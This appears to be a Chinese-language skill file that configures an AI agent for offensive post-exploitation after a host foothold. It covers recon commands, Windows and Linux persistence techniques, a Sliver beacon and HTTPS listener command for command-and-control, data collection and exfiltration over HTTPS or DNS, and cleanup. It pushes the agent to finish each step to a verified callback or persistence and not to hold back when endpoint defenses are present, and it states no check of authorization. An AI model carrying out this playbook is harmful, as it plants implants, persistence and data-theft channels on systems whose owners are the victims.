---
name: post
description: "OS post-exploitation after a stable host foothold: quiet host recon, host-native persistence (Windows Run/tasks/services/COM/WMI and Linux SSH/cron/systemd/SUID), long-term C2 (Sliver primary, Mythic/Havoc optional), targeted collection and exfil, and engagement cleanup. Does not own AD/cloud/K8s native persistence, Ligolo pivoting, LSASS dumping, or EDR bypass. Operator selects objectives; success is a live callback, verified persistence, delivered loot, or restored host — not generating an unused implant."
---

# /post — 主机后渗透

> **scope：** 已有 **稳定 host foothold**（不必 SYSTEM）后，做主机画像、**host-native** 持久化、长期 C2、定向收集/外带、清理。不做横移利用、域/云/K8s 平台持久化、本机提权、凭据破解。▸ 所选目标完成后，候选只认 `~/.claude/skills/shared/modules.yaml`（`modules.py tail`），由操作者选。

持久化/清理会改系统，**每步等操作者确认**。条件成立就做到验证（beacon 回连、任务还在），不要停在「生成了 exe」。

工具：`../shared/tools.md`。本模块默认不查 CVE。禁止开局把持久化/C2/清理七份全读；决策树走到哪项目标再 Read 那一份。

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 成功条件

操作者进本模块时选定 1～n 项目标：

```text
稳定 host foothold
        ↓
A. 长期通道  → beacon 按约定 sleep 回连（不是 generate 成功）
B. 重启仍在  → logon/reboot 后仍能回来（至少查询到任务/服务/key + 一次回连）
C. 带走数据  → 指定文件到达操作机
D. 收工      → 本场投放物按 RESTORE 撤掉，notes 可复盘
        ↓
所选目标完成 → /post COMPLETE
```

**不算成功：** 只 `generate`、只加了 Run 没验证、只 `find *.kdbx`、只 `wevtutil cl Security`。

hashdump / getsystem / 网段枢轴 / AMSI patch **不是本模块正文**（`/creds` `/privesc-win` `/tunnel` `/edr-bypass`）。

---

## 0.4 不要吸收

| 能力 | 模块 |
|---|---|
| Ligolo / 网段变可达 | `/tunnel`（会话里应急 portfwd 可以） |
| 会话稳定、传文件 | `/shell` |
| SAM/LSASS/DPAPI/Titus | `/creds` |
| Potato / getsystem | `/privesc-win` `/privesc-linux` |
| loader / PPL / WDAC | `/edr-bypass` |
| Golden Ticket / AD 对象 | `/ad-attack` |
| IAM AccessKey / Lambda | `/cloud-attack` |
| K8s RBAC / DaemonSet | `/k8s` |

---

## 0.5 Endpoint Defense Boundary — 可选 /edr-bypass Handoff

仍属 `/post`、不是 EDR：

```text
防火墙挡住 C2 端口（换 listener/transport）
GPO 禁 WMI / 禁计划任务（换原语）
用户没有 HKLM 权限（改 HKCU 或先提权）
```

只有 **implant/持久化二进制已经在 OS 执行或落地** 且被 AV/EDR/AMSI/WDAC 隔离或杀死：

```text
post primitive (drop / beacon / persist)
        ↓
endpoint security blocks intended action?
├─ NO  → 继续 /post 直到所选目标完成
└─ YES → 操作者可临时选择 /edr-bypass
            ↓
         恢复落地或回连能力
            ↓
         返回 /post
            ↓
         把 C2/持久化做完
```

不要因为场上有 EDR 就把 `/post` 改成「只讨论、不投放」。被拦再交接。

---

## 1. 决策树

```text
稳定 foothold
    ↓
Quiet 主机画像（谁在用、出网、杀软产品名、域没域）
    ↓
这次要什么？（可多选，每项只 Read 一份）
  画像 → references/host-recon.md
  通道 → references/c2-sliver.md ；回连失败再 Read c2-opsec.md
  留下 → Win: references/persistence-windows.md ；Linux: references/persistence-linux.md
  带走 → references/collection-exfil.md ；密钥文件交 /creds
  收工 → references/cleanup.md
    ↓
所选目标验证通过
```

---

## 2. Quiet 主机画像（先做）

```cmd
whoami /all
quser
net session
net share
ipconfig /all
```

```bash
id; w; last -n 10
ip a; ip r; ss -tlnp
hostnamectl 2>/dev/null; echo $USERDNSDOMAIN
```

完整（会话、共享、出网、防御产品名）→ **references/host-recon.md**。不要跑 winPEAS。

---

## 3. Host-native 持久化

Windows 低权：HKCU Run / Startup / HKCU COM。  
Windows 高权：HKLM Run / 服务 / SYSTEM 任务。WMI 高噪声，不当默认隐蔽。  
Linux：`authorized_keys`、cron、systemd（含 user linger）、SUID；`ld.so.preload` 要 root。

写完必须查询验证，并记下 RESTORE。完整 → `references/persistence-windows.md` / `references/persistence-linux.md`。

平台持久化不要写在这里。

---

## 4. 长期 C2

P0 **Sliver**。看到 `[*] Beacon <id>`（或 session 交互）才算通道成功。

```
generate beacon --http C2 --os windows --arch amd64 --skip-symbols --seconds 60 --jitter 20 --name update
https --lhost 0.0.0.0 --lport 443
```

teamserver 不要对目标网暴露；implant → redirector → teamserver。完整 → **references/c2-sliver.md**、**references/c2-opsec.md**。

Mythic = P1。Havoc = 可选，先看仓库是否维护。Adaptix 只点名。会话内 `socks5` 应急可以；扫网段用 `/tunnel`。

---

## 5. 定向收集 / 外带

先写路径清单，再打包。默认 HTTPS；HTTPS 死再 DNS。撞到 `.kdbx` / `.pem` / `credentials` → **`/creds`**。完整 → **references/collection-exfil.md**。

---

## 6. 清理

先停 beacon、按持久化 RESTORE 撤投放物、删暂存 loot。**默认不清** Security / auth.log 整卷。完整 → **references/cleanup.md**。

---

## 7. 完成后

```text
目标：C2 / persist / loot / cleanup
验证：回连 ID / 任务名 / 文件哈希 / 已删对象
RESTORE 命令：
防御产品：
```

候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。
